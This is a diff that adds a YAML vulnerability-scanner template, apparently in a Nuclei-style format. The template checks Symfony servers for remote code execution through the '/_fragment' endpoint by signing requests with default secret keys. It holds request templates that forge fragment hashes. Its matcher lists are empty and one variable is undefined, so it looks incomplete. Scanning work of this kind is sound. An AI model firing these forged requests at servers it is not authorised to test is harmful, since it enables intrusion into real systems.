@@ -1,0 +1,20 @@
+id: symfony-rce
+brief:
+    title: Symfony _fragment - Default Key RCE
+    by: Yablargo
+    level: critical
+    about: Symfony servers support a "/_fragment" command that allows clients to provide custom PHP commands and return the HTML output.
+    label:
+        - rce
+        - symfony
+        - misconfig
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/{{uri_part}}&_hash={{url_encode(base64(hex_decode(hmac("sha256","{{BaseURL}}/{{uri_part}}",badsecretkey))))}}'
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/{{uri_part}}&_hash={{url_encode(base64(hex_decode(hmac("sha256","{{BaseURL}}/{{uri_part}}",secretkey))))}}'
+      signs: []
